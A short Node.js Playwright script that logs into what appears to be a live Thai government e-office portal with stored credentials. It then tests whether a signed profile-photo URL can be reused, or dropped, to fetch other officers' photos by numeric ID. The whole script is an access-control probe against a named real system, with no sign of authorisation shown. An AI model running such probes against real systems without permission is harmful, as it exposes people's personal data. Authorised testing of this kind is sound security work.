// Can a signed photo URL be reused for another officer id?
const fs = require('fs');
const os = require('os');
const path = require('path');
const os0 = require('os');
let chromium;
try { ({ chromium } = require('playwright')); }
catch (e) { ({ chromium } = require(path.join(os0.homedir(), 'mcp', 'playwright', 'node_modules', 'playwright'))); }

const SECRETS = path.join(os.homedir(), '.secrets');
const USER = fs.readFileSync(path.join(SECRETS, 'EOFFICE_USER.txt'), 'utf8').trim();
const PASS = fs.readFileSync(path.join(SECRETS, 'EOFFICE_PASS.txt'), 'utf8').trim();
const BASE = 'https://eoffice.vayupak.net';

(async () => {
  const browser = await chromium.launch({ headless: true });
  const ctx = await browser.newContext({ locale: 'th-TH' });
  const page = await ctx.newPage();
  const photoUrls = [];
  page.on('request', r => { if (/\/document\/Temp\/profile\//.test(r.url())) photoUrls.push(r.url()); });

  await page.goto(BASE + '/sign-in?redirectURL=%2Fnew_portal', { waitUntil: 'domcontentloaded' });
  await page.waitForSelector('input[placeholder="ชื่อผู้ใช้งาน"]', { timeout: 30000 });
  await page.fill('input[placeholder="ชื่อผู้ใช้งาน"]', USER);
  await page.fill('input[placeholder="รหัสผ่าน"]', PASS);
  await page.click('button[type="submit"]:has-text("เข้าสู่ระบบ")');
  await page.waitForFunction(() => !location.href.includes('/sign-in'), { timeout: 40000 });
  await page.waitForTimeout(6000);

  const own = photoUrls[0];
  console.log('own photo url:', own);
  if (!own) { console.log('no profile photo loaded for this account'); await browser.close(); return; }

  const signed = new URL(own);
  const qs = signed.search;

  // try the same signature on other ids
  for (const id of [382, 521, 890, 999]) {
    const url = `${signed.origin}/document/Temp/profile/EXT0/-${id}.JPG${qs}`;
    const r = await page.request.get(url, { failOnStatusCode: false });
    const len = (await r.body()).length;
    console.log(`id ${id} with reused sig -> ${r.status()} ${r.headers()['content-type']} ${len}b`);
  }
  // and without signature
  const r2 = await page.request.get(`${signed.origin}/document/Temp/profile/EXT0/-382.JPG`, { failOnStatusCode: false });
  console.log('no sig ->', r2.status(), (await r2.body()).length, 'b');
  await browser.close();
})().catch(e => { console.error('FAILED:', e.message.split('\n')[0]); process.exit(1); });